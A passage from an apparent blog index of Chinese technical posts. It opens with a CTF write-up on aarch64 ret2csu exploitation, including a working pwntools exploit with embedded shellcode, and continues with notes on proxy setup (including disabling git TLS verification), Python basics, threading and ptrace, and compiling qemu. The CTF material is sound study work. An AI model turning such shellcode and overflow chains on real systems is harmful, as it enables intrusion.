可读可写可执行时prot应当为7\n```\n\n**ret2csu**\n\narm下的ret2csu可以实现两次控制流劫持：1、从0x4008cc处进入，通过布置好栈空间控制x19~x30内的几个寄存器，并将x30设置为0x4008ac，从而使程序执行上面这段gadget；2、进入0x4008ac后，w0/x1/x2/x3都会被栈空间的值给覆盖，将x3设置为目标地址，可以实现**第一次控制流劫持**；3、`blr x3`返回后继续往下执行，如果此时x19和x20的值相同，就又会执行到0x4008cc；4、此时，通过布置栈空间可以再次控制x30，当执行到ret时，就实现了**第二次控制流劫持**。\n\n```assembly\n.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j\n.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]\n.text:00000000004008B0                 MOV             X2, X22\n.text:00000000004008B4                 MOV             X1, X23\n.text:00000000004008B8                 MOV             W0, W24\n.text:00000000004008BC                 ADD             X19, X19, #1\n.text:00000000004008C0                 BLR             X3\n.text:00000000004008C4                 CMP             X19, X20\n.text:00000000004008C8                 B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j\n.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]\n.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC                 RET\n```\n\n画个图表示一下实现两次控制流劫持时，栈空间的布局。x29处是低地址，x24处是高地址。\n\n```\n           第 一 段 栈 空 间\n\n +----+     +-----+\n | x0 +<----+ x24 |\n +----+     +-----+\n | x1 +<----+ x23 |\n +----+     +-----+\n | x2 +<----+ x22 |\n +----+     +-----+\n | x3 +<----+ x21 |   注 意 ， 这 里 是 取 [x21] 给 x3\n +----+     +-----+\n | 1  +<----+ x20 |\n +----+     +-----+\n | 0  +<----+ x19 |\n +----+     +-----+      +----------------------------+\n            | x30 +----->+ 上 一 段 gadget，偏 移 0x20左 右   |\n            +-----+      +----------------------------+\n            | x29 +----->+ anything                   |\n            +-----+      +----------------------------+\n\n\n\n           第 二 段 栈 空 间\n\n+-----+      +---------------------------------+\n| x24 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x23 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x22 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x21 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x20 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x19 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x30 +----->+ 下 一 个 目 标 跳 转 地 址 , 如 shellcode |\n+-----+      +---------------------------------+\n| x29 +----->+ anything                        |\n+-----+      +---------------------------------+\n```\n\n整理一下利用思路：\n\n- 第一次输入将shellcode放入bss段\n\n- 第二次输入时溢出覆盖返回地址（至ret2csu），并布置好栈空间\n  1. 第一段栈空间实现跳转到下一个gadget，并将关键寄存器赋值\n  2. 第二段栈空间实现一个跳转，一般是跳到shellcode或某个关键函数地址上执行\n\n接下来，只需要对照着IDA仔细地将栈空间布置好，就可以了。exp如下\n\n```python\nfrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# myproc = process(['qemu-aarch64','-g','1234','-L','/usr/aarch64-linux-gnu/','./pwn'])\nmyproc = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./pwn'])\n\nshellcode = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nshellcode += \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nshellcode += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\ninput1 = shellcode.ljust(0x50,'\\x00') + p64(0x4007e0)\n\n# 函数返回时，栈空间的SP指向栈中“返回地址的上一个”，因此构造的栈紧挨着覆盖的返回地址处\npadding_func = 'a'*72 + p64(0x4008cc)\nstack1 = flat([0x0,0x4008ac,0x0,0x1,0x411068+0x50,0x7,0x1000,0x411000])\nstack2 = flat([0x0,0x411068,0x0,0x0,0x0,0x0,0x0,0x0])\n\ninput2 = padding_func + stack1 + stack2\nmyproc.sendafter('Name:',input1)\nmyproc.sendline(input2)\nmyproc.interactive()\n```\n\n# pwndbg常用指令\n\n```shell\ni r lr   # 查看lr寄存器的值\np $lr    # 打印lr寄存器的值（十进制）\n```","categories":["CTF"]},{"title":"Linux下的各种代理设置","url":"/2021/01/26/configure-proxy/","content":"\n## http代理\n\n> socks代理的话，把http换成socks或者socks5就可以了\n\n- proxychains\n\n```shell\nsudo apt search proxychains\nsudo apt install xxx\nvim /etc/proxychains.conf\t# 修改配置文件，设置代理\n```\n\n- export环境变量\n\n```shell\n# 设置\nexport http_proxy=ip:port\nexport https_proxy=ip:port\n## 如果代理服务器需要登录：\nexport http_proxy=http://userName:password@proxyAddress:port\nexport https_proxy=http://userName:password@proxyAddress:port\n\n# 取消设置\nunset http_proxy \n## 或 \nunset https_proxy\n\n# 永久加入\n## 在shell配置文件.bashrc或者.zshrc中添加上述内容\nvim ~/.bashrc\n```\n\n\n\n## git代理\n\n- 设置 - 有用户名密码\n\n```sh\ngit config --global user.name \"blingxxxxuanxxx\"\ngit config --global user.email \"xxx@163.com\"\nssh-keygen -t rsa -b 4096 -C \"xxx@163.com\"\ngit config --global http.proxy http://用户名:密码@ip:port\ngit config --global https.proxy http://用户名:密码@ip:port\ngit config --global http.sslVerify false\n```\n\n- 设置 - 无用户名密码情况\n\n```shell\ngit config --global http.proxy http://ip:port\ngit config --global https.proxy http://ip:port\n```\n\n- 查看代理：\n\n```shell\ngit config --global --get http.proxy\ngit config --global --get https.proxy\n```\n\n- 取消代理\n\n```shell\ngit config --global --unset http.proxy\ngit config --global --unset https.proxy\n```\n\n- 其他命令\n\n```shell\ngit config --list\n```\n\n\n\n## pip 代理\n\n使用 `--proxy=代理服务器IP:端口` 的方式：\n\n```shell\nsudo /usr/bin/python3.6 -m pip --proxy=http://192.168.56.1:808 install --target /usr/local/lib/python3.6/dist-packages -Ur requirements.txt\n```\n\n\n\n## gem 代理\n\n找到gem文件位置，打开gem文件，在begin下添加args并配置代理：\n\n```shell\nbling@Ubuntu2004:~$ which gem\n/usr/bin/gem\nbling@Ubuntu2004:~$ vim /usr/bin/gem\nbegin\n  args += ['--http-proxy','http://x.x.x.x:port']\t\t# 添加这一句\n  Gem::GemRunner.new.run args\nrescue Gem::SystemExitException => e\n  exit e.exit_code\nend\n```","categories":["基础技能"]},{"title":"python3学习","url":"/2021/01/23/study-python3/","content":"\n花了一天，参考W3Cschool学了下python3的基础，做了个笔记给自己看。\n\n# 探索\n\n## python3下字符串、bytes、hex之间的转换\n\n```\n      \"\".encode()                 b\"\".hex()\n  +----------------+     +- ------------------------+\n  |                |     |                          |\n  |                |     |                          |\n+-+--+           +-v-----+-+                  +-----v-----+\n| \"\" |           |  bytes  |                  |  hex str  |\n+-^--+           +-+-----^-+                  +-----+-----+\n  |                |     |                          |\n  |                |     |                          |\n  +----------------+     +--------------------------+\n     b\"\".decode()               bytes.fromhex(\"\")\n\n```\n\n最左侧是str对象，中间是bytes对象。他俩之间的转换通过encode()与decode()函数，可以指定utf-8，gbk，ascii等编码方式。\n\n最右侧是hex表示的字符串，在python3中可通过bytes对象进行互相转换。\n\n转换示例如下：\n\n- str - bytes\n\n```shell\n>>> \"hello world\".encode()\nb'hello world'\n>>> \"hello world\".encode('gbk')\nb'hello world'\n>>> \"hello world\".encode('ascii')\t\t# 英文字符的编码就是它自己\nb'hello world'\n>>> '我'.encode()\nb'\\xe6\\x88\\x91'\n>>> '我'.encode('utf-8')\t\t\t# str.encode()的默认编码方式是utf-8\nb'\\xe6\\x88\\x91'\n>>> '我'.encode('gbk')\nb'\\xce\\xd2'\n>>> '我'.encode('ascii')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nUnicodeEncodeError: 'ascii' codec can't encode character '\\u6211' in position 0: ordinal not in range(128)\n```\n\n- bytes - str\n\n```shell\n>>> b'\\xe6\\x88\\x91'.decode()\t\t# bytes.decode()的默认解码方式是utf-8\n'我'\n>>> b'\\xce\\xd2'.decode('gbk')\n'我'\n>>> b'\\xce\\xd2'.decode()\t\t\t# 以gbk编码的字节流，若未指定解码方式，默认以utf-8解码时会出错\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nUnicodeDecodeError: 'utf-8' codec can't decode byte 0xce in position 0: invalid continuation byte\n```\n\n- bytes - hex\n\n```shell\n>>> b'\\xe6\\x88\\x91'.hex()\n'e68891'\n>>> b'hello world'.hex()\n'68656c6c6f20776f726c64'\n>>> b'\\xce\\xd2'.hex()\n'ced2'\n```\n\n- hex - bytes\n\n```shell\n>>> bytes.fromhex('e68891')\nb'\\xe6\\x88\\x91'\n>>> bytes.fromhex('68656c6c6f20776f726c64')\nb'hello world'\n>>> bytes.fromhex('ced2')\nb'\\xce\\xd2'\n```\n\npython3中其他方式：\n\n```shell\nimport codecs\n>>> codecs.encode(b'aaa','hex')\nb'616161'\n>>> codecs.decode(b'\\x61\\x61\\x61')\n'aaa'\n>>> codecs.decode(b'\\x61\\x61\\x61','utf-8')\n'aaa'\n```\n\npython2中：\n\n```shell\n>>> '\\x61\\x61\\x63'.decode()\nu'aac'\n>>> '616263'.decode('hex')\n'abc'\n>>> 'abc'.encode('hex')\n'616263'\n```\n\n# python3模块\n\n- keyword\n\n```shell\n>>> import keyword\n>>> keyword.kwlist\n['False', 'None', 'True', '__peg_parser__', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']\n```\n\n- sys\n\n```python\nimport sys\nfor i in sys.argv:\n    print(i)\nfor i in sys.path:\n    print(i)\nprint(sys.path)\n\nfrom sys import argv,path\nfor i in argv:\n    print(i)\nfor i in path:\n    print(i)\nprint(path)\n```\n\n- os\n\n```shell\nimport os\nos.system('ls')\n```\n\n# 数据类型\n\n> Python 中有六个标准的数据类型：Number（数字），String（字符串），List（列表），Tuple（元组），Set（集合），Dictionary（字典）\n\n不可变数据：Number（数字），String（字符串），Tuple（元组）\n\n可变数据：List（列表），Set（集合），Dictionary（字典）\n\n```\n可通过type(xxx)查看数据类型\n```\n\n## Number\n\n> python3支持int，float，bool，complex\n\n```shell\n>>> 5 + 4  # 加法\n9\n>>> 4.3 - 2 # 减法\n2.3\n>>> 3 * 7  # 乘法\n21\n>>> 2 / 4  # 除法，得到一个浮点数\n0.5\n>>> 2 // 4 # 除法，得到一个整数\n0\n>>> 17 % 3 # 取余 \n2\n>>> 2 ** 5 # 乘方\n32\n```\n\n## String\n\n> 用双引号或单引号括起来，反斜杠`'\\'`作为转义字符和续行符\n\n```shell\n>>> print('Hello\\nwrold！')\nHello\nworld!\n>>> print(r'Hello\\nwrold！')\t\t# 使用r让反斜杠不转义\nHello\\nwrold！\t\t\t\t\t\n```\n\n- 字符串拼接：`+`和`*`\n\n```shell\n>>> print('str'+'ing', 'my'*3)\nstring mymymy\n```\n\n- 字符串索引：`[]`\n\n```shell\n>>> word = 'Python'\n>>> print(word[0], word[5])\nP n\n>>> print(word[-1], word[-6])\nn P\n```\n\n- 字符串切片：`[:]`\n\n```shell\n>>> word = 'ilovepython'\n>>> word[1:5]\n'love'\n>>> word[:]\n'ilovepython'\n>>> word[5:]\n'python'\n>>> word[-10:-6]\n'love'\n```\n\n## List\n\n> 使用方括号，逗号组成的元素列表，元素类型可不相同\n\n```sh\n>>> a = ['him', 25, 100, 'her']\n>>> print(a)\n['him', 25, 100, 'her']\n```\n\n- 列表串联拼接：`+`\n\n```shell\n>>> a = [1, 2, 3, 4, 5]\n>>> a + [6, 7, 8]\n[1, 2, 3, 4, 5, 6, 7, 8]\n```\n\n- 列表索引：`[]`\n\n```shell\n>>> a = ['him', 25, 100, 'her']\n>>> a[0]\n'him'\n>>> a[0] = 9\t\t\t#列表的元素可以更改\n>>> print(a)\n[9, 25, 100, 'her']\t\t\n>>> letters[:] = []\t\t#清除列表\n>>> letters\n```\n\n- 列表切片：`[:]`\n\n```sh\n>>> a = [1, 2, 3, 4, 5,6]\n>>> a[2:5] = [13, 14, 15]\t\t# 替换一些值\n>>> a\n[9, 2, 13, 14, 15, 6]\n>>> a[2:5] = []   \t\t# 删除\n>>> a\n[9, 2, 6]\n```\n\n- append() pop()等方法\n\n```shell\n# 使用append()方法在列表的末尾添加新项：\n>>> cubes = [1, 8, 27, 64, 125]\n>>> cubes.append(216)  # cube列表中添加新值\n>>> cubes.append(343)  #  cube列表中添加第七个值\n>>> cubes\n[1, 8, 27, 64, 125, 216, 343]\n```\n\n\n\n## Tuple\n\n> 使用方括号，逗号组成的元素元组，元素类型可不相同\n\n```shell\n>>> a = (1991, 2014, 'physics', 'math')\n>>> print(a, type(a), len(a))\n(1991, 2014, 'physics', 'math') <class 'tuple'> 4\n>>> tup1 = () \t\t# 空元组\n>>> tup2 = (20,)\t# 包含一个元素的元组，注意后面有逗号\n```\n\n- 元组拼接：`+`\n\n```shell\n>>> tup1, tup2 = (1, 2, 3), (4, 5, 6)\n>>> print(tup1+tup2)\n(1, 2, 3, 4, 5, 6)\n```\n\n- 元组索引：`[]`\n\n```\n>>> tup1 = (1,2,3)\n>>> print(tup1[0])\n1\n```\n\n- 元组切片：`[:]`\n\n```\n>>> tup1 = (1,2,3)\n>>> print(tup1[0:1])\n(1,)\n```\n\n- 删除元组\n\n```shell\n>>> del tup1\n```\n\n- 元组的内置函数\n\n```shell\n>>> tuple1 = ('Google', 'W3CSchool', 'Taobao')\n>>> len(tuple1)\t\t# 计算元组的元素个数\n3\n\n>>> tuple2 = ('5', '4', '8')\n>>> max(tuple2)\t\t# 返回元组中元素的最大值\n'8'\n\n>>> tuple2 = ('5', '4', '8')\n>>> min(tuple2)\t\t# 返回元组中元素的最小值\n'4'\n\n>>> list1= ['Google', 'Taobao', 'W3CSchool', 'Baidu']\n>>> tuple1=tuple(list1)\t\t# 将list列表转换为元组\n>>> tuple1\n('Google', 'Taobao', 'W3CSchool', 'Baidu')\n\n>>> import operator\n>>> dict1 = (1, 2, 3)\n>>> dict2 = ('a', 'b', 'c')\n>>> operator.eq(dict1, dict2)\t\t# 比较两个元组的元素\nFalse\n```\n\n## Set\n\n> 一个无序不重复元素的集合，使用大括号{}或set()函数创建\n>\n> tips：**set()创建空集合，{}创建空字典**\n\n```shell\n>>> student = {'Tom', 'Jim', 'Mary', 'Tom', 'Jack', 'Rose'}\n>>> print(student)   \t\t# 重复的元素被自动去掉\n{'Jim', 'Jack', 'Mary', 'Tom', 'Rose'}\n>>> 'Rose' in student \t\t # membership testing（成员测试）\nTrue\n>>> # set可以进行集合运算\n... \n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a\n{'a', 'b', 'c', 'd', 'r'}\n>>> a - b     \t\t# a和b的差集\n{'b', 'd', 'r'}\n>>> a | b    \t\t # a和b的并集\n{'l', 'm', 'a', 'b', 'c', 'd', 'z', 'r'}\n>>> a & b    \t\t # a和b的交集\n{'a', 'c'}\n>>> a ^ b    \t\t # a和b中不同时存在的元素\n{'l', 'm', 'b', 'd', 'z', 'r'}\n```\n\n## Dictionary\n\n> 一种映射类型（mapping type），在大括号{}中包含一些无序的键值对，**关键字必须使用不可变类型**\n\n```shell\n>>> tel = {} \t\t \t\t# 创建空字典\n>>> tel = {'Jack':1557, 'Tom':1320, 'Rose':1886}\n>>> tel\n{'Tom': 1320, 'Jack': 1557, 'Rose': 1886}\n>>> tel['Jack']   \t\t\t# 通过key查询\n1557\n>>> del tel['Rose']  \t\t# 删除一个键值对\n>>> tel['Mary'] = 4127  \t# 添加一个键值对\n>>> tel\n{'Tom': 1320, 'Jack': 1557, 'Mary': 4127}\n>>> list(tel.keys())  \t\t# 返回所有key组成的list\n['Tom', 'Jack', 'Mary']\n>>> sorted(tel.keys()) \t\t# 按key排序\n['Jack', 'Mary', 'Tom']\n>>> 'Tom' in tel       \t\t# 成员测试\nTrue\n>>> 'Mary' not in tel  \t\t# 成员测试\nFalse\n```\n\n使用dict()构造函数从sequence中构造字典，也可进行推导。（string、list 和 tuple 都属于 sequence（序列））\n\n```shell\n>>> dict([('sape', 4139), ('guido', 4127), ('jack', 4098)])\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n\n>>> {x: x**2 for x in (2, 4, 6)}\n{2: 4, 4: 16, 6: 36}\n\n>>> dict(sape=4139, guido=4127, jack=4098)\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n```\n\n- 删除字典元素\n\n```python\ndict = {'Name': 'W3CSchool', 'Age': 7, 'Class': 'First'}\n\ndel dict['Name'] \t\t# 删除键 'Name'\ndict.clear()     \t\t# 删除字典\ndel dict         \t\t# 删除字典\n```\n\n字典类型有一些内置函数，例如 clear()、keys()、values() 等。\n\n# 语法及API\n\n## 条件控制\n\n```python\nif condition_1:\n    statement_block_1\nelif condition_2:\n    statement_block_2\nelse:\n    statement_block_3\n```\n\n## 循环\n\n```python\nwhile 判断条件：\n    statements\n```\n\n```python\nfor <variable> in <sequence>:\n    <statements>\nelse:\n    <statements>\n```\n\n```python\n# 使用break跳出当前循环体\nedibles = [\"ham\", \"spam\",\"eggs\",\"nuts\"]\n\nfor food in edibles:\n    if food == \"spam\":\n        print(\"No more spam please!\")\n        break\n    print(\"Great, delicious \" + food)\n    else:\n        print(\"I am so glad: No spam!\")\n\nprint(\"Finally, I finished stuffing myself\")\n```\n\n- range()函数\n\n```shell\n>>> for i in range(5):\n...     print(i)\n...\n0\n1\n2\n3\n4\n\n>>> for i in range(5,9) :\n  print(i) \n5\n6\n7\n8\n\n>>> for i in range(0, 10, 3) :\n    print(i)\n0\n3\n6\n9\n\n>>> for i in range(-10, -100, -30) :\n   print(i)\n-10\n-40\n-70\n\n>>> list(range(5))\n[0, 1, 2, 3, 4]\n```\n\n- continue和pass\n\n## 迭代器与生成器\n\n> 迭代器的两个基本方法：iter()和next()\n\n```shell\n# 字符串，列表或元组对象都可用于创建迭代器\n>>> list=[1,2,3,4]\n>>> it = iter(list)    # 创建迭代器对象\n>>> print(next(it))   # 输出迭代器的下一个元素\n1\n>>> print(next(it))\n2\n\n# 使用for语句遍历迭代器对象\nlist=[1,2,3,4]\nit = iter(list)    # 创建迭代器对象\nfor x in it:\n    print(x, end=\" \")\n# 执行结果为：1 2 3 4\n\n# 使用next函数\nimport sys         # 引入 sys 模块\nlist=[1,2,3,4]\nit = iter(list)    # 创建迭代器对象\nwhile True:\n    try:\n        print(next(it))\n    except StopIteration:\n        sys.exit()\n#执行完的输出\n1\n2\n3\n4\n```\n\n> 生成器是使用了yield的函数\n\n在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值。并在下一次执行 next() 方法时从当前位置继续运行。\n\n```python\nimport sys\n\ndef fibonacci(n): # 生成器函数 - 斐波那契\n    a, b, counter = 0, 1, 0\n    while True:\n        if (counter > n): \n            return\n        yield a\n        a, b = b, a + b\n        counter += 1\nf = fibonacci(10) # f 是一个迭代器，由生成器返回生成\n\nwhile True:\n    try:\n        print (next(f), end=\" \")\n    except StopIteration:\n        sys.exit()\n```\n\n输出：\n\n```\n0 1 1 2 3 5 8 13 21 34 55\n```\n\n## 函数\n\n```python\ndef  函数名（参数列表）：\n\t函数体\n```\n\n- 不定长参数：`*`\n\n```python\ndef printinfo( arg1, *vartuple ):\n   \"打印任何传入的参数\"\n   print \"输出: \"\n   print arg1\n   for var in vartuple:\n      print var\n   return;\n \n# 调用printinfo 函数\nprintinfo( 10 );\nprintinfo( 70, 60, 50 );\n\n# 输出:\n# 10\n# 输出:\n# 70\n# 60\n# 50\n```\n\n- 匿名函数：`lambda`\n\n> lambda [arg1 [,arg2,.....argn]]:expression\n\n```python\nsum = lambda arg1, arg2: arg1 + arg2;\n \n#调用sum函数\nprint \"Value of total : \", sum( 10, 20 )\nprint \"Value of total : \", sum( 20, 20 )\n```\n\n## 输入和输出\n\n输入：input()，read()\n\n输出：print()，write()，str.format()，sys.stdout()\n\n```shell\n>>> for x in range(1, 11):\n...     print('{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x))\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n\n>>> print('bbb'.ljust(10),'==>','ccc'.rjust(10))\t\t# str.rjust()与str.ljust()\nbbb        ==>        ccc\n\n>>> print('aaa'.center(10),'bbb'.center(10))\t\t\t# str.center()\n   aaa        bbb \n   \n>>> print('aaa'.zfill(10))\t\t\t\t# st=r.zfill()\n0000000aaa\n```\n\n将值转换为字符串：repr()，str()\n\n```\n>>> repr('\\x64')\n\"'d'\"\n>>> str('\\x64')\n'd'\n```\n\n## 读写文件\n\n> open() 将会返回一个 file 对象\n\n```python\nopen(filename, mode)\t\t\t\t\t# 若不提供mode的话，默认以只读方式打开\n>>> f = open('/tmp/workfile', 'w')     # 以只写的方式打开文件\n>>> f = open('/tmp/workfile','r')\t\t# 以只读的方式打开文件\n>>> f = open('/tmp/workfile','a')\t\t# 以追加的方式打开文件\n>>> f = open('/tmp/workfile','r+')\t\t# 以读写的方式打开文件\n```\n\nf.read(n)：读取文件内容，以字符串或字节对象返回。n指定读取大小，若n为0或负数则返回文件所有内容\n\nf.readline()：读取文件中的一行'\\n'，如果返回空字符串则说明已经读取到最后一行\n\n```shell\n>>> f.readline()\t\n'This is the first line of the file.\\n'\n>>> f.readline()\n'Second line of the file\\n'\n>>> f.readline()\n''\n```\n\nf.readlines() ：返回文件包含的所有行，返回的是一个list。\n\n```shell\n>>> f.readlines()\n['line1 line11\\n', 'line2 line22\\n', 'line3 line33\\n']\n>>> f.readlines(20)\n['line1 line11\\n', 'line2 line22\\n']\n```\n\nf.write()：f.write(string) 将 string 写入到文件中, 然后返回写入的字符数\n\n```shell\n>>> f.write('This is a test\\n')\n15\n\n>>> value = ('the answer', 42)\t\t# 若写入的不是字符串，则需要先进行转换\n>>> s = str(value)\n>>> f.write(s)\n18\n```\n\nf.tell()：返回文件对象当前所处的位置，是从文件开头算起的字节数。\n\nf.seek()：改变文件当前位置。 `f.seek(offset, from_what)`\n\n```\nfrom_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾，例如：\n\nseek(x, 0) ： 从起始位置即文件首行首字符开始移动 x 个字符\nseek(x, 1) ： 表示从当前位置往后移动x个字符\nseek(-x, 2)：表示从文件的结尾往前移动x个字符\n```\n\nf.close()：关闭文件。\n\n# 标准库概览\n\n[W3Cschool-标准库概览](https://www.w3cschool.cn/python3/python3-stdlib.html)\n\n# tips\n\n- 复合赋值\n\n```python\n# Fibonacci series: 斐波纳契数列\n# 两个元素的总和确定了下一个数\na, b = 0, 1\nwhile b < 10:\n    print(b)\n    a, b = b, a + b;\n```\n\n- end关键字\n\n>  用于将结果输出到同一行，或者在输出的末尾添加不同的字符\n\n```python\na, b = 0, 1\nwhile b < 1000:\n    print(b,end=',')\n    a, b = b, a + b;\n```","categories":["编程语言"]},{"title":"linux下多线程编程与调试","url":"/2021/01/23/pthread-fork-ptrace/","content":"\n# linux下多线程编程之pthread\n\n\n`pthread_self()` 可获取当前线程号。\n\n`getpid()` 可获取当前进程号。\n\n`pthread_join(t1, NULL);` 或者`pthread_exit(NULL)` 可以分别看做一种同步方式，等所有子线程执行完后main函数才退出。\n\n如下示例代码可以看出这以上各函数的作用：\n\n```c\n//gcc test.c lpthread -o test\n//test.c\n#include <stdio.h>   //printf\n#include <pthread.h> //pthread_xxx\n\nvoid *thread_func(void *p)\n{\n    long i = (long)p;\n    pthread_t tid = pthread_self();\n    for (int j = 0; j < 5; j++)\n    {\n        printf(\"thread id is:%lu --- %d --- %d\\n\",tid,i,j);\n    }\n\n    return NULL;\n}\n\nint main()\n{\n    pthread_t t1, t2;\n    pid_t pid = getpid();\n    printf(\"PID is: %lu\\n\",pid);\n    pthread_create(&t1, 0, thread_func, (void *)1);\n    pthread_create(&t2, 0, thread_func, (void *)2);\n\n//    pthread_join(t1, NULL);\n//    pthread_join(t2, NULL);\n//    pthread_exit(NULL);\n    return 0;\n}\n```\n\n参考：\n\n[pthread常用函数](https://zhuanlan.zhihu.com/p/86208167)\n\n[pthread并行编程入门](https://segmentfault.com/a/1190000020655588)\n\n# linux下多进程编程之fork\n\nfork()函数通过系统调用创建一个与原来进程几乎完全相同的进程。\n- 在父进程中，fork返回新创建子进程的进程ID；\n- 在子进程中，fork返回0；\n- 如果出现错误，fork返回一个负值；\n如下代码可以帮助我们了解fork()\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main () \n{ \n\tpid_t fpid; \n\tint count=0;\n\tfpid=fork(); \n\tif (fpid < 0) \n\t\tprintf(\"error in fork!\\n\"); \n\telse if (fpid == 0) {\n\t\tprintf(\"i am the child process, getpid() is: %d,getppid() is: %d,fpid is: %d\\n\",getpid(),getppid(),fpid); \n\t\tcount++;\n\t}\n\telse {\n\t\tprintf(\"i am the parent process, getpid() is: %d,getppid() is: %d,fpid is: %d\\n\",getpid(),getppid(),fpid); \n\t\tcount++;\n        count++;\n\t}\n\tprintf(\"count is: %d\\n\",count);\n\treturn 0;\n}\n```\n\n参考：\n\n[linux中fork（）函数详解（原创！！实例讲解）](https://blog.csdn.net/jason314/article/details/5640969)\n\n\n# ptrace\n\n- ptrace追踪子进程系统调用号\n\n```c\n// 64 bit system\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/reg.h>\n#include <sys/user.h>   /* For constants \n                                   ORIG_EAX etc */\nint main()\n{\n    pid_t child;\n    long orig_eax;\n    long test;\n    child = fork();\n    if(child == 0) {\n        ptrace(PTRACE_TRACEME, 0, NULL, NULL);\n        execl(\"/bin/ls\", \"ls\", NULL);\n    }\n    else {\n        wait(NULL);\n        orig_eax = ptrace(PTRACE_PEEKUSER,child, 8 * ORIG_RAX,NULL);\n        printf(\"The child made a system call %ld\\n\",orig_eax);\n        ptrace(PTRACE_CONT, child, NULL, NULL);\n    }\n    return 0;\n}\n```\n- ptrace进程附着调试\n\n```c\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/reg.h>\n#include <sys/user.h>   /* For constants \n                                   ORIG_EAX etc */\n\nint main(int argc, char *argv[])\n{   \n    pid_t traced_process;\n    struct user_regs_struct regs;\n    long ins;\n    if(argc != 2) {\n        printf(\"Usage: %s <pid to be traced> \",argv[0]);\n        exit(1);\n    }\n    traced_process = atoi(argv[1]);\n    ptrace(PTRACE_ATTACH, traced_process, \n           NULL, NULL);\n    wait(NULL);\n    ptrace(PTRACE_GETREGS, traced_process, \n           NULL, &regs);\n    printf(\"regs.rip is: 0x%llx\\n\",regs.rip);\n    ins = ptrace(PTRACE_PEEKTEXT, traced_process, \n                 regs.rip, NULL);\n    printf(\"RIP: %llx Instruction executed: %lx\\n\",regs.rip, ins);\n    ptrace(PTRACE_DETACH, traced_process, \n           NULL, NULL);\n    return 0;\n}\n```\n参考：\n\n[Linux沙箱之ptrace](https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/)\n\n[ptrace运行原理及使用详解](https://blog.csdn.net/edonlii/article/details/8717029)","categories":["编程语言"]},{"title":"linux下的源码编译","url":"/2021/01/20/source-code-compile/","content":"\n# 源码编译\n\n把这篇参考文章[linux下源代码的编译安装入门](https://www.jianshu.com/p/39101098ebbe)完整看并动手实践下来，对源码编译就有了宏观上粗略的了解。\n\n另外还需要了解多级目录下makefile的编写及编译过程。\n\n## 三步走\n\n### configure - 检查\n\n```shell\nconfigure --prefix=dir/\n# 指定安装目录dir/，后续make install时会安装到dir/目录下（不指定的话，默认是/usr/local/bin目录）\n# 安装的二进制文件存放在dir/bin/目录下\n# 安装的资源文件存放在dir/share/目录下\n```\n\n```shell\nconfigure --help\n# 查看详细的帮助说明，如--sys-config=xxx进行参数设定，--with/--enable/--without/--disable等对编译过程进行控制\n```\n\n### make - 编译\n\n> 除了有些用perl或python编写的软件（使用perl或python进行编译），大部分源代码都是需要通过make进行编译的\n\nmake是linux开发套件里面自动化编译的一个控制程序，它通过makefile里的编译规则自动调用gcc，ld等进行编译。makefile可以自行编写，也可以通过configure脚本根据给定的参数和系统环境生成。\n\n### make install - 安装\n\n> make通过加'参数'`make install`或`make uninstall`来进行安装或卸载，若不加'参数'则表示进行默认的源代码编译\n\n默认情况下，通常需要root权限来运行`make install`，因为待写入目录可能权限较高（如/usr/local/bin）。\n\n对部分软件而言，需要在`make install`前先运行`make check`或`make test`来进行一些测试。\n\n## 编译qemu\n\n下载qemu源码\n\n```shell\nwget https://download.qemu.org/qemu-5.2.0.tar.xz\ntar Jxvf qemu-5.2.0.tar.xz\ncd qemu-5.2.0\ncd ..\nmkdir -p build-qemu\n```\n\n安装ninja\n\n```shell\nsudo apt install re2c\ngit clone git://github.com/ninja-build/ninja.git && cd ninja\n./configure.py --bootstrap\ncp ninja /usr/bin/\nninja --version\n```\n\n编译qemu\n\n```shell\nsudo apt install pkg-config libglib2.0-dev libmount-dev python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential autoconf automake libfreetype6-dev 